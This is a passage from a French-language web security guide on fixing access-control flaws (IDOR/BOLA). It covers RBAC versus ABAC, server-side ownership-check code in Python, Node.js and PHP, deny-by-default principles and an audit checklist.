    **Chaque accès à un objet doit revalider explicitement, côté serveur, que le sujet authentifié (`current_user`) est autorisé à effectuer l'action demandée sur cet objet précis** — à chaque requête, sans exception, y compris pour les appels inter-services internes.

**RBAC vs ABAC :**

| Modèle | Principe | Cas d'usage typique |
|---|---|---|
| **RBAC** (*Role-Based Access Control*) | Les permissions sont attachées à un rôle (`admin`, `user`, `support`), lui-même attaché à l'utilisateur | Suffisant lorsque les droits ne dépendent pas de la relation entre l'utilisateur et l'objet précis |
| **ABAC** (*Attribute-Based Access Control*) | Les permissions dépendent d'attributs combinés (rôle **et** propriétaire **et** tenant **et** état de l'objet) | Nécessaire dès qu'il faut répondre à "cet utilisateur a-t-il le droit sur **cet objet précis**", ce qui est le cœur du problème IDOR/BOLA |

Dans la majorité des cas d'IDOR/BOLA, un RBAC seul est insuffisant : un rôle `user` valide l'accès à la fonctionnalité "consulter une facture" en général, mais seul un contrôle ABAC (`facture.owner_id == current_user.id`) empêche l'accès à la facture d'un tiers.

**Remplacement des identifiants directs :**

- Utiliser des références indirectes non devinables (UUIDv4, ou identifiants éphémères liés à la session/au contexte de la requête) réduit la surface d'énumération opportuniste.
- **Cet avertissement doit toujours accompagner une telle recommandation :** un UUID rend l'énumération séquentielle impraticable, mais reste directement exploitable si divulgué (URL partagée, log, `Referer`, export) — **l'obscurité de l'identifiant n'est jamais un substitut au contrôle d'autorisation serveur**, elle ne fait qu'augmenter le coût de reconnaissance pour un attaquant, pas l'éliminer.

**Exemples de code correctif — vérification d'appartenance systématique :**

```python
# Python / Flask — contrôle d'appartenance explicite avant tout accès à l'objet
from flask import Flask, jsonify, abort, g

app = Flask(__name__)

@app.route("/api/invoices/<int:invoice_id>", methods=["GET"])
@require_auth  # décorateur qui peuple g.current_user à partir du token/session
def get_invoice(invoice_id):
    invoice = db.session.execute(
        "SELECT * FROM invoices WHERE id = :id AND owner_id = :owner_id",
        {"id": invoice_id, "owner_id": g.current_user.id},
    ).fetchone()

    if invoice is None:
        # Réponse volontairement identique, que l'objet n'existe pas
        # ou qu'il appartienne à un autre utilisateur : évite de confirmer
        # l'existence de ressources hors périmètre (pas d'oracle 403 vs 404).
        abort(404)

    return jsonify(dict(invoice))
```

```javascript
// Node.js / Express — middleware générique de vérification d'appartenance,
// réutilisable sur l'ensemble des routes exposant un object_id
const requireOwnership = (resourceLoader) => async (req, res, next) => {
  const resource = await resourceLoader(req.params.id);

  if (!resource) {
    return res.status(404).json({ error: "Not found" });
  }
  if (resource.ownerId !== req.currentUser.id && !req.currentUser.roles.includes("admin")) {
    // Même code de statut que "introuvable" pour ne pas fuiter l'existence de l'objet
    return res.status(404).json({ error: "Not found" });
  }

  req.resource = resource;
  next();
};

app.get(
  "/api/documents/:id",
  authenticate,
  requireOwnership((id) => Document.findById(id)),
  (req, res) => res.json(req.resource)
);
```

```php
<?php
// PHP — vérification d'appartenance au niveau de la requête SQL elle-même,
// jamais uniquement en post-traitement applicatif
$stmt = $pdo->prepare(
    "SELECT * FROM documents WHERE id = :id AND owner_id = :owner_id"
);
$stmt->execute([
    ':id' => $requestedId,
    ':owner_id' => $currentUser->id,
]);
$document = $stmt->fetch();

if ($document === false) {
    // 404 générique, quel que soit le motif réel (inexistant ou appartenance à un tiers)
    http_response_code(404);
    exit(json_encode(['error' => 'Not found']));
}
?>
```

**Bonnes pratiques complémentaires :**

- Centraliser la logique d'autorisation dans une couche unique (middleware, décorateur, policy engine type OPA/Casbin) plutôt que de la dupliquer route par route — la duplication est la première cause d'oubli.
- Pour les architectures multi-tenant, inclure systématiquement `tenant_id` dans **chaque** clause de filtrage, y compris les jointures indirectes (cas de l'IDOR de second ordre, section 8.4).
- En environnement microservices, ne jamais faire confiance à un `user_id`/`tenant_id` transmis par un service appelant sans re-signature ou re-vérification cryptographique du contexte (éviter le pattern *confused deputy*).
- Pour GraphQL, appliquer le contrôle d'autorisation **au niveau du resolver**, pas uniquement au niveau du endpoint HTTP, afin de couvrir tous les chemins de requête possibles vers un même champ.
- Journaliser et alerter sur les patterns d'énumération (accès séquentiels rapides à des `id` consécutifs par un même compte) pour détecter une exploitation active avant l'exfiltration complète.

---

## 9. Mesures de Protection & Bonnes Pratiques (principes transverses)

Au-delà des correctifs techniques détaillés en [section 8.5](#85-remédiation--hardening-perspective-blue-team) pour IDOR/BOLA, cinq principes directeurs s'appliquent à **l'ensemble** des failles de contrôle d'accès présentées dans cette fiche (vertical, horizontal, contextuel) :

!!! danger "Deny by Default"
    Appliquer **systématiquement** le principe du **refus par défaut** pour toute ressource ou fonctionnalité : une route, un champ ou une action ne doit être accessible qu'après une **autorisation explicite**, jamais par omission d'une règle de blocage. Toute nouvelle route créée sans politique de sécurité associée doit être considérée comme **non autorisée** tant qu'elle n'a pas été explicitement couverte.

!!! warning "Bannir l'obscurité comme mécanisme de sécurité"
    Ne **jamais** compter sur le masquage d'une URL, l'absence de lien dans l'interface utilisateur, ou la complexité apparente d'un chemin pour protéger une ressource (cf. [section 5.1](#51-escalade-de-privilèges-verticale--vecteurs-complémentaires)). L'API ou le contrôleur backend doit **valider implacablement les droits** à chaque requête, indépendamment de la façon dont le client a découvert l'URL.

!!! tip "Centraliser la sécurité"
    Utiliser un **mécanisme unique et transversal** (middleware, filtre, policy engine) pour gérer l'ensemble des contrôles d'accès, plutôt que de réimplémenter la logique d'autorisation route par route ou service par service. La duplication de la logique de sécurité est la cause la plus fréquente d'oubli constaté en audit (cf. recommandation équivalente en [section 8.5](#85-remédiation--hardening-perspective-blue-team) pour les architectures microservices).

!!! tip "Déclarations explicites de permissions"
    Exiger, au niveau du code ou de la configuration, que **chaque route/endpoint** associe **explicitement** une politique de sécurité (rôle requis, règle ABAC, scope OAuth, etc.). L'absence de déclaration doit déclencher une erreur de configuration ou un refus par défaut (cf. *Deny by Default* ci-dessus), jamais un accès silencieusement autorisé.

!!! info "Audits continus"
    Mettre en place des **tests de non-régression automatisés** ciblant spécifiquement le contrôle d'accès (matrice rôle × endpoint testée en CI/CD) ainsi que des **revues de code ciblées** sur toute modification touchant à l'authentification, à la gestion de session ou aux autorisations. Un contrôle d'accès correctement implémenté à un instant T peut être silencieusement cassé par une modification ultérieure non revue sous cet angle.

### Synthèse — checklist d'audit du contrôle d'accès

- [ ] Les trois piliers (authentification, session, autorisation) sont-ils testés **séparément** ?
- [ ] Chaque fonctionnalité sensible est-elle protégée **côté serveur**, indépendamment de sa visibilité dans l'IHM ?
- [ ] Les contrôles verticaux sont-ils appliqués sur **toutes** les méthodes HTTP et variantes de casse/chemin d'une route protégée ?
- [ ] Les contrôles horizontaux vérifient-ils la **propriété réelle** de l'objet (et non la simple existence de l'identifiant) ?
- [ ] Les règles contextuelles (étapes de workflow) sont-elles revalidées à **chaque** étape, y compris la dernière ?
- [ ] Aucune décision d'autorisation ne repose sur une donnée **contrôlable par le client** (paramètre, cookie, `Referer`, en-tête de géolocalisation) ?
- [ ] La logique d'autorisation est-elle **centralisée** plutôt que dupliquée ?
- [ ] Des tests de non-régression couvrent-ils la matrice rôle × endpoint en CI/CD ?
